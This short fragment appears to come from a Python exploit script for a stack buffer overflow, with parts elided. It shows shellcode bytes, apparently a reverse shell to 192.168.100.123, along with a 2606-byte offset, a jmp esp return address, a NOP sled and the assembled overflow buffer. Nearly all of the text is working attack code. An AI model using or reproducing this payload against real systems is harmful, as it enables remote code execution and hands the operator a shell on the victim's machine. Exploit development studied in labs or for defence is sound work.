...
"\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xc0\xa8\x64\x7b\x68"
...
"\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5")
    ...
    # buffer = offset + jmp esp + 10 NOP slides + shellcode + rest of buffer
    nop_space = "\x90" * 10
    buffer = "A" * 2606 + "\x8f\x35\x4a\x5f" + nop_space + shellcode + 'C' * (4000 - 2606 - 4 - 324- 10 )   
